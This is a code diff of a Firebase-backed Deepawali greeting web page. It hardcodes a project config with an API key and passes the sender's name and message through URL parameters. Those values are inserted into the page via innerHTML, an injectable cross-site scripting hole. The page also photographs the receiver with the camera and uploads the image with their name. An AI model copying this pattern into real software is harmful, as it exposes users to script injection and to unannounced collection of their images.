@@ -116,24 +116,23 @@
     import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_AUTH_DOMAIN",
-        projectId: "YOUR_PROJECT_ID",
-        storageBucket: "YOUR_STORAGE_BUCKET",
-        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-        appId: "YOUR_APP_ID"
-    };
-
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyAwB8JWKIRK6Bkat-NdM6OyVAvdrBk5cmM",
+  authDomain: "capturedeep-126bf.firebaseapp.com",
+  projectId: "capturedeep-126bf",
+  storageBucket: "capturedeep-126bf.appspot.com",
+  messagingSenderId: "527347157327",
+  appId: "1:527347157327:web:d7db7bb6d0fe021547dd3a",
+  measurementId: "G-VZEFR8X5BN"
+};
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
     const db = getFirestore(app);
 
     let senderDetails = {};
 
-    // Define startProcess as a global function
     window.startProcess = function() {
-        console.log("Start process triggered"); // Debug
         document.getElementById("mainContainer").style.display = "none";
         document.getElementById("senderPopup").style.display = "flex";
 
@@ -142,28 +141,43 @@
     };
 
     window.generateLink = function() {
-        console.log("Generate link triggered"); // Debug
-        senderDetails.name = document.getElementById("senderName").value;
-        senderDetails.dignity = document.getElementById("senderDignity").value;
-        senderDetails.message = document.getElementById("senderMessage").value;
+        senderDetails.name = document.getElementById("senderName").value.trim();
+        senderDetails.dignity = document.getElementById("senderDignity").value.trim();
+        senderDetails.message = document.getElementById("senderMessage").value.trim();
 
         if (!senderDetails.name || !senderDetails.message) {
             alert("Please enter your name and message.");
             return;
         }
 
+        const encodedMessage = encodeURIComponent(senderDetails.message);
+        const generatedLink = `${window.location.origin}/receiver.html?senderName=${encodeURIComponent(senderDetails.name)}&dignity=${encodeURIComponent(senderDetails.dignity)}&message=${encodedMessage}`;
+        
+        document.getElementById("generatedLink").textContent = generatedLink;
         document.getElementById("senderPopup").style.display = "none";
         document.getElementById("linkPopup").style.display = "flex";
-        document.getElementById("generatedLink").textContent = `www.yourwebsite.com/receiver.html?sender=${senderDetails.name}`;
     };
 
-    window.copyLink = function() {
-        navigator.clipboard.writeText(document.getElementById("generatedLink").textContent);
-        alert("Link copied to clipboard!");
+    window.shareLink = function() {
+        const link = document.getElementById("generatedLink").textContent;
+        if (navigator.share) {
+            navigator.share({
+                title: "Deepawali Wishes",
+                text: "Here's a special Deepawali message for you!",
+                url: link
+            }).catch(error => console.log("Sharing failed:", error));
+        } else {
+            alert("Sharing is not supported on this device.");
+        }
     };
 
     window.captureReceiverImage = async function() {
-        const receiverName = document.getElementById("receiverName").value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const senderName = urlParams.get("senderName");
+        const dignity = urlParams.get("dignity");
+        const message = urlParams.get("message");
+        const receiverName = document.getElementById("receiverName").value.trim();
+
         if (!receiverName) {
             alert("Please enter your name.");
             return;
@@ -188,7 +202,7 @@
         await saveReceiverData(receiverName, imageUrl);
 
         stream.getTracks().forEach(track => track.stop());
-        displayMessage(receiverName, imageUrl);
+        displayMessage(receiverName, imageUrl, senderName, dignity, message);
     };
 
     async function saveReceiverData(name, imageUrl) {
@@ -198,14 +212,14 @@
         });
     }
 
-    function displayMessage(receiverName, imageUrl) {
+    function displayMessage(receiverName, imageUrl, senderName, dignity, message) {
         document.getElementById("receiverPopup").style.display = "none";
         document.getElementById("messagePopup").style.display = "flex";
 
         const letterContent = `
             Dear ${receiverName},<br><br>
-            ${senderDetails.message}<br><br>
-            Best regards,<br>${senderDetails.name} (${senderDetails.dignity})
+            ${message}<br><br>
+            Best regards,<br>${senderName} (${dignity})
         `;
         document.getElementById("letterContent").innerHTML = letterContent;
         document.getElementById("loader").style.display = "none";
@@ -213,4 +227,5 @@
 </script>
 
 </body>
-</html>
+    </html>
+    
